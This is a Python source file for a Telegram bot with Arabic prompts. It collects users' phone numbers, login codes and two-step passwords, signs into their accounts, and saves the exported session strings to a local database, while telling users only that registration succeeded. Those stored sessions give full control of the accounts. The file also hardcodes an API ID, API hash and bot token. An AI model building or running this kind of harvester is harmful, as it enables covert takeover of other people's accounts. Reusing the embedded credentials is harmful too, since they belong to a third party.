from pyrogram import Client, filters,errors
import telebot,random
from kvsqlite.sync import Client as uu


api_id = '22119881'
api_hash = '95f5f60466a696e33a34f297c734d048'
bot_token = '6705675219:AAFw9ZrxYNvw452p-PocAs83S4DzfoU6ntI'



 
bot = telebot.TeleBot(bot_token, threaded=False,num_threads=55,skip_pending=True)

db = uu('dbs/elhakem.ss', 'rshq')
def adds(session: str, phone: str)-> bool:
    d = db.get('accounts')
    d.append({"s":session, 'phone': phone})
    db.set("accounts", d)
    return True

@bot.message_handler(func=(lambda message: True))
def start(message):
    try:         
        if "+" in message.text:
           
            bot.send_message(message.chat.id,"-- ⊳ الرجاء الانتظار ...  جاري التسجيل .")
            _client = Client("::memory::", in_memory=True,api_id=api_id, api_hash=api_hash,lang_code="ar")
            _client.connect()
            SendCode = _client.send_code(message.text)
            Mas = bot.send_message(message.chat.id,"-- ⊳ قم بارسال الكود التحقق .")
            
            bot.register_next_step_handler(Mas, sigin_up,_client,message.text,SendCode.phone_code_hash,message.text)	
        else:
            Mas = bot.send_message(message.chat.id,"• ارسل الان رقم الهاتف الخاص بك مع رمز الدولة \n• مثال: \n+20466133155")
    except Exception as e:
        bot.send_message(message.chat.id,"ERORR : "+e)


def sigin_up(message,_client,phone,hash,name):
    try:
        bot.send_message(message.chat.id,"-- ⊳ الرجاء الانتظار ...   .")
        _client.sign_in(phone, hash, message.text)
        bot.send_message(message.chat.id,"-- ⊳ تم تسجيل الحساب بنجاح ✅ .")
        ses= _client.export_session_string()
        adds(ses,name)

    except errors.SessionPasswordNeeded:
        Mas = bot.send_message(message.chat.id,"-- ⊳ قم بإرسال الباسورد الحساب .")
        bot.register_next_step_handler(Mas, AddPassword,_client,name)	
       

def AddPassword(message,_client,name):
    try:
       
        _client.check_password(message.text) 
        
        ses= _client.export_session_string()

        adds(ses,name)
        try:
            _client.stop()
        except:
            pass
        bot.send_message(message.chat.id,"-- ⊳ تم تسجيل الحساب بنجاح ✅ .")
    except Exception as e:
        print(e)
        try:
            _client.stop()
        except:
            pass
        bot.send_message(message.chat.id,f"ERORR : {e} ")



bot.infinity_polling(none_stop=True,timeout=30, long_polling_timeout = 25)



# # code by ruks 2023/6/22 the end (:
# @ruks3
